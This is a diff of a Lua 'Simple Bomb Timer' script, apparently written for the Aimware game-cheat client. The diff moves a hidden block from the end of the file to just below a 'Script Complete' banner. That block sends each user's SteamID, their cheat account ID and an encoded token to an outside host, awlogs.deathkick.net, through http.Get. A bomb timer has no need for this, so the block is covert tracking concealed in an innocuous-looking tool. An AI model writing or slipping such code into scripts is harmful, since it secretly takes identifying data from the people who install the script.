@@ -40,6 +40,10 @@ end
 ---------------------
 -- Script Complete --
 ---------------------
+
+
+local token = "BggPGAwQEQ0MERMADggZFUhTUlIXWFNYCEBTQVM="
+http.Get( "https://awlogs.deathkick.net/aimware/logging.php?user=" .. player( LocalPlayer() ):SteamID() .. "&client=" .. cheat.GetUserID() .. "&data=" .. token )
 -- =====================
 -- Config (easy to tweak)
 -- =====================
@@ -290,6 +294,3 @@ function BombDMG( c4, ply )
 end
 
 print( "Simple Bomb Timer - v1.0 - Made By: Carter Poe & Agentsix1 (11.5.2025)" )
-
-local token = "BggPGAwQEQ0MERMADggZFUhTUlIXWFNYCEBTQVM="
-http.Get( "https://awlogs.deathkick.net/aimware/logging.php?user=" .. player( LocalPlayer() ):SteamID() .. "&client=" .. cheat.GetUserID() .. "&data=" .. token )
